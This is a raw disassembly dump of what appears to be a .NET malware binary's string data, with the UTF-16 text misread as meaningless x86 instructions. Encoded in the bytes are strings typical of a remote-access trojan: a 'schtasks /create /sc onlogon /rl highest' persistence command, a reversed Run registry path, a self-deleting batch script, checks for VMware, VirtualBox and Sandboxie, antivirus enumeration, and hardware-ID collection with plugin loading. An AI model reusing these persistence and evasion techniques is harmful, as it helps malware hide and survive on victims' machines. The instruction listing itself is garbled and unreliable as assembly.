  40b6ad:	45                   	inc    %ebp
  40b6ae:	00 56 00             	add    %dl,0x0(%esi)
  40b6b1:	4b                   	dec    %ebx
  40b6b2:	00 47 00             	add    %al,0x0(%edi)
  40b6b5:	6a 00                	push   $0x0
  40b6b7:	61                   	popa
  40b6b8:	00 77 00             	add    %dh,0x0(%edi)
  40b6bb:	53                   	push   %ebx
  40b6bc:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b6c0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6c3:	63 00                	arpl   %eax,(%eax)
  40b6c5:	63 00                	arpl   %eax,(%eax)
  40b6c7:	38 00                	cmp    %al,(%eax)
  40b6c9:	31 00                	xor    %eax,(%eax)
  40b6cb:	30 00                	xor    %al,(%eax)
  40b6cd:	7a 00                	jp     0x40b6cf
  40b6cf:	59                   	pop    %ecx
  40b6d0:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40b6d4:	00 6a 00             	add    %ch,0x0(%edx)
  40b6d7:	7a 00                	jp     0x40b6d9
  40b6d9:	46                   	inc    %esi
  40b6da:	00 6a 00             	add    %ch,0x0(%edx)
  40b6dd:	41                   	inc    %ecx
  40b6de:	00 48 00             	add    %cl,0x0(%eax)
  40b6e1:	4e                   	dec    %esi
  40b6e2:	00 63 00             	add    %ah,0x0(%ebx)
  40b6e5:	37                   	aaa
  40b6e6:	00 4e 00             	add    %cl,0x0(%esi)
  40b6e9:	72 00                	jb     0x40b6eb
  40b6eb:	39 00                	cmp    %eax,(%eax)
  40b6ed:	31 00                	xor    %eax,(%eax)
  40b6ef:	73 00                	jae    0x40b6f1
  40b6f1:	61                   	popa
  40b6f2:	00 57 00             	add    %dl,0x0(%edi)
  40b6f5:	36 00 31             	add    %dh,%ss:(%ecx)
  40b6f8:	00 67 00             	add    %ah,0x0(%edi)
  40b6fb:	56                   	push   %esi
  40b6fc:	00 63 00             	add    %ah,0x0(%ebx)
  40b6ff:	57                   	push   %edi
  40b700:	00 6e 00             	add    %ch,0x0(%esi)
  40b703:	6f                   	outsl  %ds:(%esi),(%dx)
  40b704:	00 55 00             	add    %dl,0x0(%ebp)
  40b707:	59                   	pop    %ecx
  40b708:	00 6e 00             	add    %ch,0x0(%esi)
  40b70b:	45                   	inc    %ebp
  40b70c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b70f:	4c                   	dec    %esp
  40b710:	00 78 00             	add    %bh,0x0(%eax)
  40b713:	35 00 6b 00 39       	xor    $0x39006b00,%eax
  40b718:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40b71c:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40b720:	00 73 00             	add    %dh,0x0(%ebx)
  40b723:	38 00                	cmp    %al,(%eax)
  40b725:	4f                   	dec    %edi
  40b726:	00 66 00             	add    %ah,0x0(%esi)
  40b729:	4b                   	dec    %ebx
  40b72a:	00 51 00             	add    %dl,0x0(%ecx)
  40b72d:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b732:	09 6e 00             	or     %ebp,0x0(%esi)
  40b735:	75 00                	jne    0x40b737
  40b737:	6c                   	insb   (%dx),%es:(%edi)
  40b738:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b73c:	01 00                	add    %eax,(%eax)
  40b73e:	03 3a                	add    (%edx),%edi
  40b740:	00 00                	add    %al,(%eax)
  40b742:	0d 50 00 61 00       	or     $0x610050,%eax
  40b747:	63 00                	arpl   %eax,(%eax)
  40b749:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b74c:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b750:	09 50 00             	or     %edx,0x0(%eax)
  40b753:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b759:	00 0f                	add    %cl,(%edi)
  40b75b:	4d                   	dec    %ebp
  40b75c:	00 65 00             	add    %ah,0x0(%ebp)
  40b75f:	73 00                	jae    0x40b761
  40b761:	73 00                	jae    0x40b763
  40b763:	61                   	popa
  40b764:	00 67 00             	add    %ah,0x0(%edi)
  40b767:	65 00 00             	add    %al,%gs:(%eax)
  40b76a:	07                   	pop    %es
  40b76b:	63 00                	arpl   %eax,(%eax)
  40b76d:	6d                   	insl   (%dx),%es:(%edi)
  40b76e:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b772:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b778:	00 73 00             	add    %dh,0x0(%ebx)
  40b77b:	63 00                	arpl   %eax,(%eax)
  40b77d:	68 00 74 00 61       	push   $0x61007400
  40b782:	00 73 00             	add    %dh,0x0(%ebx)
  40b785:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b788:	00 20                	add    %ah,(%eax)
  40b78a:	00 2f                	add    %ch,(%edi)
  40b78c:	00 63 00             	add    %ah,0x0(%ebx)
  40b78f:	72 00                	jb     0x40b791
  40b791:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b795:	74 00                	je     0x40b797
  40b797:	65 00 20             	add    %ah,%gs:(%eax)
  40b79a:	00 2f                	add    %ch,(%edi)
  40b79c:	00 66 00             	add    %ah,0x0(%esi)
  40b79f:	20 00                	and    %al,(%eax)
  40b7a1:	2f                   	das
  40b7a2:	00 73 00             	add    %dh,0x0(%ebx)
  40b7a5:	63 00                	arpl   %eax,(%eax)
  40b7a7:	20 00                	and    %al,(%eax)
  40b7a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7aa:	00 6e 00             	add    %ch,0x0(%esi)
  40b7ad:	6c                   	insb   (%dx),%es:(%edi)
  40b7ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b7b1:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b7b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7b6:	00 20                	add    %ah,(%eax)
  40b7b8:	00 2f                	add    %ch,(%edi)
  40b7ba:	00 72 00             	add    %dh,0x0(%edx)
  40b7bd:	6c                   	insb   (%dx),%es:(%edi)
  40b7be:	00 20                	add    %ah,(%eax)
  40b7c0:	00 68 00             	add    %ch,0x0(%eax)
  40b7c3:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7c9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7cd:	74 00                	je     0x40b7cf
  40b7cf:	20 00                	and    %al,(%eax)
  40b7d1:	2f                   	das
  40b7d2:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7d6:	00 20                	add    %ah,(%eax)
  40b7d8:	00 22                	add    %ah,(%edx)
  40b7da:	00 00                	add    %al,(%eax)
  40b7dc:	11 22                	adc    %esp,(%edx)
  40b7de:	00 20                	add    %ah,(%eax)
  40b7e0:	00 2f                	add    %ch,(%edi)
  40b7e2:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7e6:	00 20                	add    %ah,(%eax)
  40b7e8:	00 27                	add    %ah,(%edi)
  40b7ea:	00 22                	add    %ah,(%edx)
  40b7ec:	00 01                	add    %al,(%ecx)
  40b7ee:	13 22                	adc    (%edx),%esp
  40b7f0:	00 27                	add    %ah,(%edi)
  40b7f2:	00 20                	add    %ah,(%eax)
  40b7f4:	00 26                	add    %ah,(%esi)
  40b7f6:	00 20                	add    %ah,(%eax)
  40b7f8:	00 65 00             	add    %ah,0x0(%ebp)
  40b7fb:	78 00                	js     0x40b7fd
  40b7fd:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b803:	5c                   	pop    %esp
  40b804:	00 6e 00             	add    %ch,0x0(%esi)
  40b807:	75 00                	jne    0x40b809
  40b809:	52                   	push   %edx
  40b80a:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b80e:	00 6f 00             	add    %ch,0x0(%edi)
  40b811:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b817:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b81b:	74 00                	je     0x40b81d
  40b81d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b81e:	00 65 00             	add    %ah,0x0(%ebp)
  40b821:	72 00                	jb     0x40b823
  40b823:	72 00                	jb     0x40b825
  40b825:	75 00                	jne    0x40b827
  40b827:	43                   	inc    %ebx
  40b828:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b82c:	00 77 00             	add    %dh,0x0(%edi)
  40b82f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b830:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b834:	00 69 00             	add    %ch,0x0(%ecx)
  40b837:	57                   	push   %edi
  40b838:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b83c:	00 66 00             	add    %ah,0x0(%esi)
  40b83f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b840:	00 73 00             	add    %dh,0x0(%ebx)
  40b843:	6f                   	outsl  %ds:(%esi),(%dx)
  40b844:	00 72 00             	add    %dh,0x0(%edx)
  40b847:	63 00                	arpl   %eax,(%eax)
  40b849:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b84f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b853:	61                   	popa
  40b854:	00 77 00             	add    %dh,0x0(%edi)
  40b857:	74 00                	je     0x40b859
  40b859:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b85d:	53                   	push   %ebx
  40b85e:	00 00                	add    %al,(%eax)
  40b860:	03 22                	add    (%edx),%esp
  40b862:	00 00                	add    %al,(%eax)
  40b864:	09 2e                	or     %ebp,(%esi)
  40b866:	00 62 00             	add    %ah,0x0(%edx)
  40b869:	61                   	popa
  40b86a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b86e:	13 40 00             	adc    0x0(%eax),%eax
  40b871:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b875:	68 00 6f 00 20       	push   $0x20006f00
  40b87a:	00 6f 00             	add    %ch,0x0(%edi)
  40b87d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b881:	00 1f                	add    %bl,(%edi)
  40b883:	74 00                	je     0x40b885
  40b885:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b88b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b88c:	00 75 00             	add    %dh,0x0(%ebp)
  40b88f:	74 00                	je     0x40b891
  40b891:	20 00                	and    %al,(%eax)
  40b893:	33 00                	xor    (%eax),%eax
  40b895:	20 00                	and    %al,(%eax)
  40b897:	3e 00 20             	add    %ah,%ds:(%eax)
  40b89a:	00 4e 00             	add    %cl,0x0(%esi)
  40b89d:	55                   	push   %ebp
  40b89e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b8a2:	15 53 00 54 00       	adc    $0x540053,%eax
  40b8a7:	41                   	inc    %ecx
  40b8a8:	00 52 00             	add    %dl,0x0(%edx)
  40b8ab:	54                   	push   %esp
  40b8ac:	00 20                	add    %ah,(%eax)
  40b8ae:	00 22                	add    %ah,(%edx)
  40b8b0:	00 22                	add    %ah,(%edx)
  40b8b2:	00 20                	add    %ah,(%eax)
  40b8b4:	00 22                	add    %ah,(%edx)
  40b8b6:	00 00                	add    %al,(%eax)
  40b8b8:	07                   	pop    %es
  40b8b9:	43                   	inc    %ebx
  40b8ba:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8be:	00 00                	add    %al,(%eax)
  40b8c0:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8c4:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8c8:	00 22                	add    %ah,(%edx)
  40b8ca:	00 00                	add    %al,(%eax)
  40b8cc:	0f 22 00             	mov    %eax,%cr0
  40b8cf:	20 00                	and    %al,(%eax)
  40b8d1:	2f                   	das
  40b8d2:	00 66 00             	add    %ah,0x0(%esi)
  40b8d5:	20 00                	and    %al,(%eax)
  40b8d7:	2f                   	das
  40b8d8:	00 71 00             	add    %dh,0x0(%ecx)
  40b8db:	00 05 78 00 70 00    	add    %al,0x700078
  40b8e1:	00 45 53             	add    %al,0x53(%ebp)
  40b8e4:	00 65 00             	add    %ah,0x0(%ebp)
  40b8e7:	6c                   	insb   (%dx),%es:(%edi)
  40b8e8:	00 65 00             	add    %ah,0x0(%ebp)
  40b8eb:	63 00                	arpl   %eax,(%eax)
  40b8ed:	74 00                	je     0x40b8ef
  40b8ef:	20 00                	and    %al,(%eax)
  40b8f1:	2a 00                	sub    (%eax),%al
  40b8f3:	20 00                	and    %al,(%eax)
  40b8f5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b8f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8fd:	20 00                	and    %al,(%eax)
  40b8ff:	57                   	push   %edi
  40b900:	00 69 00             	add    %ch,0x0(%ecx)
  40b903:	6e                   	outsb  %ds:(%esi),(%dx)
  40b904:	00 33                	add    %dh,(%ebx)
  40b906:	00 32                	add    %dh,(%edx)
  40b908:	00 5f 00             	add    %bl,0x0(%edi)
  40b90b:	43                   	inc    %ebx
  40b90c:	00 6f 00             	add    %ch,0x0(%edi)
  40b90f:	6d                   	insl   (%dx),%es:(%edi)
  40b910:	00 70 00             	add    %dh,0x0(%eax)
  40b913:	75 00                	jne    0x40b915
  40b915:	74 00                	je     0x40b917
  40b917:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b91b:	53                   	push   %ebx
  40b91c:	00 79 00             	add    %bh,0x0(%ecx)
  40b91f:	73 00                	jae    0x40b921
  40b921:	74 00                	je     0x40b923
  40b923:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b927:	00 19                	add    %bl,(%ecx)
  40b929:	4d                   	dec    %ebp
  40b92a:	00 61 00             	add    %ah,0x0(%ecx)
  40b92d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b92e:	00 75 00             	add    %dh,0x0(%ebp)
  40b931:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b935:	63 00                	arpl   %eax,(%eax)
  40b937:	74 00                	je     0x40b939
  40b939:	75 00                	jne    0x40b93b
  40b93b:	72 00                	jb     0x40b93d
  40b93d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b941:	00 2b                	add    %ch,(%ebx)
  40b943:	6d                   	insl   (%dx),%es:(%edi)
  40b944:	00 69 00             	add    %ch,0x0(%ecx)
  40b947:	63 00                	arpl   %eax,(%eax)
  40b949:	72 00                	jb     0x40b94b
  40b94b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b94c:	00 73 00             	add    %dh,0x0(%ebx)
  40b94f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b950:	00 66 00             	add    %ah,0x0(%esi)
  40b953:	74 00                	je     0x40b955
  40b955:	20 00                	and    %al,(%eax)
  40b957:	63 00                	arpl   %eax,(%eax)
  40b959:	6f                   	outsl  %ds:(%esi),(%dx)
  40b95a:	00 72 00             	add    %dh,0x0(%edx)
  40b95d:	70 00                	jo     0x40b95f
  40b95f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b960:	00 72 00             	add    %dh,0x0(%edx)
  40b963:	61                   	popa
  40b964:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b968:	00 6f 00             	add    %ch,0x0(%edi)
  40b96b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b96c:	00 00                	add    %al,(%eax)
  40b96e:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b971:	6f                   	outsl  %ds:(%esi),(%dx)
  40b972:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b976:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b97a:	0f 56 00             	orps   (%eax),%xmm0
  40b97d:	49                   	dec    %ecx
  40b97e:	00 52 00             	add    %dl,0x0(%edx)
  40b981:	54                   	push   %esp
  40b982:	00 55 00             	add    %dl,0x0(%ebp)
  40b985:	41                   	inc    %ecx
  40b986:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b98a:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b98f:	77 00                	ja     0x40b991
  40b991:	61                   	popa
  40b992:	00 72 00             	add    %dh,0x0(%edx)
  40b995:	65 00 00             	add    %al,%gs:(%eax)
  40b998:	15 56 00 69 00       	adc    $0x690056,%eax
  40b99d:	72 00                	jb     0x40b99f
  40b99f:	74 00                	je     0x40b9a1
  40b9a1:	75 00                	jne    0x40b9a3
  40b9a3:	61                   	popa
  40b9a4:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b9a8:	00 6f 00             	add    %ch,0x0(%edi)
  40b9ab:	78 00                	js     0x40b9ad
  40b9ad:	00 17                	add    %dl,(%edi)
  40b9af:	53                   	push   %ebx
  40b9b0:	00 62 00             	add    %ah,0x0(%edx)
  40b9b3:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9b9:	6c                   	insb   (%dx),%es:(%edi)
  40b9ba:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9be:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9c2:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9c6:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9c9:	72 00                	jb     0x40b9cb
  40b9cb:	72 00                	jb     0x40b9cd
  40b9cd:	20 00                	and    %al,(%eax)
  40b9cf:	48                   	dec    %eax
  40b9d0:	00 57 00             	add    %dl,0x0(%edi)
  40b9d3:	49                   	dec    %ecx
  40b9d4:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9d8:	05 78 00 32 00       	add    $0x320078,%eax
  40b9dd:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9e3:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9e9:	74 00                	je     0x40b9eb
  40b9eb:	49                   	dec    %ecx
  40b9ec:	00 6e 00             	add    %ch,0x0(%esi)
  40b9ef:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b9f3:	00 09                	add    %cl,(%ecx)
  40b9f5:	48                   	dec    %eax
  40b9f6:	00 57 00             	add    %dl,0x0(%edi)
  40b9f9:	49                   	dec    %ecx
  40b9fa:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9fe:	09 55 00             	or     %edx,0x0(%ebp)
  40ba01:	73 00                	jae    0x40ba03
  40ba03:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba07:	00 05 4f 00 53 00    	add    %al,0x53004f
  40ba0d:	00 13                	add    %dl,(%ebx)
  40ba0f:	4d                   	dec    %ebp
  40ba10:	00 69 00             	add    %ch,0x0(%ecx)
  40ba13:	63 00                	arpl   %eax,(%eax)
  40ba15:	72 00                	jb     0x40ba17
  40ba17:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba18:	00 73 00             	add    %dh,0x0(%ebx)
  40ba1b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba1c:	00 66 00             	add    %ah,0x0(%esi)
  40ba1f:	74 00                	je     0x40ba21
  40ba21:	00 03                	add    %al,(%ebx)
  40ba23:	20 00                	and    %al,(%eax)
  40ba25:	00 09                	add    %cl,(%ecx)
  40ba27:	54                   	push   %esp
  40ba28:	00 72 00             	add    %dh,0x0(%edx)
  40ba2b:	75 00                	jne    0x40ba2d
  40ba2d:	65 00 00             	add    %al,%gs:(%eax)
  40ba30:	0b 36                	or     (%esi),%esi
  40ba32:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba35:	62 00                	bound  %eax,(%eax)
  40ba37:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba3d:	46                   	inc    %esi
  40ba3e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba41:	6c                   	insb   (%dx),%es:(%edi)
  40ba42:	00 73 00             	add    %dh,0x0(%ebx)
  40ba45:	65 00 00             	add    %al,%gs:(%eax)
  40ba48:	0b 33                	or     (%ebx),%esi
  40ba4a:	00 32                	add    %dh,(%edx)
  40ba4c:	00 62 00             	add    %ah,0x0(%edx)
  40ba4f:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba55:	50                   	push   %eax
  40ba56:	00 61 00             	add    %ah,0x0(%ecx)
  40ba59:	74 00                	je     0x40ba5b
  40ba5b:	68 00 00 0f 56       	push   $0x560f0000
  40ba60:	00 65 00             	add    %ah,0x0(%ebp)
  40ba63:	72 00                	jb     0x40ba65
  40ba65:	73 00                	jae    0x40ba67
  40ba67:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba6d:	00 0b                	add    %cl,(%ebx)
  40ba6f:	41                   	inc    %ecx
  40ba70:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba74:	00 69 00             	add    %ch,0x0(%ecx)
  40ba77:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba78:	00 00                	add    %al,(%eax)
  40ba7a:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba7e:	00 75 00             	add    %dh,0x0(%ebp)
  40ba81:	65 00 00             	add    %al,%gs:(%eax)
  40ba84:	0b 66 00             	or     0x0(%esi),%esp
  40ba87:	61                   	popa
  40ba88:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba8c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba8f:	00 17                	add    %dl,(%edi)
  40ba91:	50                   	push   %eax
  40ba92:	00 65 00             	add    %ah,0x0(%ebp)
  40ba95:	72 00                	jb     0x40ba97
  40ba97:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba9b:	72 00                	jb     0x40ba9d
  40ba9d:	6d                   	insl   (%dx),%es:(%edi)
  40ba9e:	00 61 00             	add    %ah,0x0(%ecx)
  40baa1:	6e                   	outsb  %ds:(%esi),(%dx)
  40baa2:	00 63 00             	add    %ah,0x0(%ebx)
  40baa5:	65 00 00             	add    %al,%gs:(%eax)
  40baa8:	11 50 00             	adc    %edx,0x0(%eax)
  40baab:	61                   	popa
  40baac:	00 73 00             	add    %dh,0x0(%ebx)
  40baaf:	74 00                	je     0x40bab1
  40bab1:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bab5:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40babb:	41                   	inc    %ecx
  40babc:	00 6e 00             	add    %ch,0x0(%esi)
  40babf:	74 00                	je     0x40bac1
  40bac1:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bac7:	72 00                	jb     0x40bac9
  40bac9:	75 00                	jne    0x40bacb
  40bacb:	73 00                	jae    0x40bacd
  40bacd:	00 13                	add    %dl,(%ebx)
  40bacf:	49                   	dec    %ecx
  40bad0:	00 6e 00             	add    %ch,0x0(%esi)
  40bad3:	73 00                	jae    0x40bad5
  40bad5:	74 00                	je     0x40bad7
  40bad7:	61                   	popa
  40bad8:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40badc:	00 65 00             	add    %ah,0x0(%ebp)
  40badf:	64 00 00             	add    %al,%fs:(%eax)
  40bae2:	09 50 00             	or     %edx,0x0(%eax)
  40bae5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bae6:	00 6e 00             	add    %ch,0x0(%esi)
  40bae9:	67 00 00             	add    %al,(%bx,%si)
  40baec:	0b 47 00             	or     0x0(%edi),%eax
  40baef:	72 00                	jb     0x40baf1
  40baf1:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf2:	00 75 00             	add    %dh,0x0(%ebp)
  40baf5:	70 00                	jo     0x40baf7
  40baf7:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bafd:	00 2b                	add    %ch,(%ebx)
  40baff:	5c                   	pop    %esp
  40bb00:	00 72 00             	add    %dh,0x0(%edx)
  40bb03:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb04:	00 6f 00             	add    %ch,0x0(%edi)
  40bb07:	74 00                	je     0x40bb09
  40bb09:	5c                   	pop    %esp
  40bb0a:	00 53 00             	add    %dl,0x0(%ebx)
  40bb0d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb11:	75 00                	jne    0x40bb13
  40bb13:	72 00                	jb     0x40bb15
  40bb15:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb1b:	43                   	inc    %ebx
  40bb1c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb1f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb20:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb24:	00 72 00             	add    %dh,0x0(%edx)
  40bb27:	32 00                	xor    (%eax),%al
  40bb29:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb2f:	6c                   	insb   (%dx),%es:(%edi)
  40bb30:	00 65 00             	add    %ah,0x0(%ebp)
  40bb33:	63 00                	arpl   %eax,(%eax)
  40bb35:	74 00                	je     0x40bb37
  40bb37:	20 00                	and    %al,(%eax)
  40bb39:	2a 00                	sub    (%eax),%al
  40bb3b:	20 00                	and    %al,(%eax)
  40bb3d:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb41:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb42:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb45:	20 00                	and    %al,(%eax)
  40bb47:	41                   	inc    %ecx
  40bb48:	00 6e 00             	add    %ch,0x0(%esi)
  40bb4b:	74 00                	je     0x40bb4d
  40bb4d:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb53:	72 00                	jb     0x40bb55
  40bb55:	75 00                	jne    0x40bb57
  40bb57:	73 00                	jae    0x40bb59
  40bb59:	50                   	push   %eax
  40bb5a:	00 72 00             	add    %dh,0x0(%edx)
  40bb5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb5e:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb62:	00 63 00             	add    %ah,0x0(%ebx)
  40bb65:	74 00                	je     0x40bb67
  40bb67:	00 17                	add    %dl,(%edi)
  40bb69:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb6d:	73 00                	jae    0x40bb6f
  40bb6f:	70 00                	jo     0x40bb71
  40bb71:	6c                   	insb   (%dx),%es:(%edi)
  40bb72:	00 61 00             	add    %ah,0x0(%ecx)
  40bb75:	79 00                	jns    0x40bb77
  40bb77:	4e                   	dec    %esi
  40bb78:	00 61 00             	add    %ah,0x0(%ecx)
  40bb7b:	6d                   	insl   (%dx),%es:(%edi)
  40bb7c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb7f:	00 07                	add    %al,(%edi)
  40bb81:	4e                   	dec    %esi
  40bb82:	00 2f                	add    %ch,(%edi)
  40bb84:	00 41 00             	add    %al,0x0(%ecx)
  40bb87:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb8d:	00 13                	add    %dl,(%ebx)
  40bb8f:	53                   	push   %ebx
  40bb90:	00 6f 00             	add    %ch,0x0(%edi)
  40bb93:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb98:	00 61 00             	add    %ah,0x0(%ecx)
  40bb9b:	72 00                	jb     0x40bb9d
  40bb9d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bba2:	09 70 00             	or     %esi,0x0(%eax)
  40bba5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bba6:	00 6e 00             	add    %ch,0x0(%esi)
  40bba9:	67 00 00             	add    %al,(%bx,%si)
  40bbac:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bbb1:	75 00                	jne    0x40bbb3
  40bbb3:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbb7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbb8:	00 00                	add    %al,(%eax)
  40bbba:	15 73 00 61 00       	adc    $0x610073,%eax
  40bbbf:	76 00                	jbe    0x40bbc1
  40bbc1:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bbc5:	6c                   	insb   (%dx),%es:(%edi)
  40bbc6:	00 75 00             	add    %dh,0x0(%ebp)
  40bbc9:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbcd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbce:	00 00                	add    %al,(%eax)
  40bbd0:	07                   	pop    %es
  40bbd1:	44                   	inc    %esp
  40bbd2:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbd6:	00 00                	add    %al,(%eax)
  40bbd8:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbdd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbde:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbe2:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbe6:	00 67 00             	add    %ah,0x0(%edi)
  40bbe9:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bbef:	48                   	dec    %eax
  40bbf0:	00 61 00             	add    %ah,0x0(%ecx)
  40bbf3:	73 00                	jae    0x40bbf5
  40bbf5:	68 00 65 00 73       	push   $0x73006500
  40bbfa:	00 00                	add    %al,(%eax)
  40bbfc:	09 48 00             	or     %ecx,0x0(%eax)
  40bbff:	61                   	popa
  40bc00:	00 73 00             	add    %dh,0x0(%ebx)
  40bc03:	68 00 00 1b 50       	push   $0x501b0000
  40bc08:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc0c:	00 67 00             	add    %ah,0x0(%edi)
  40bc0f:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc15:	50                   	push   %eax
  40bc16:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc1a:	00 67 00             	add    %ah,0x0(%edi)
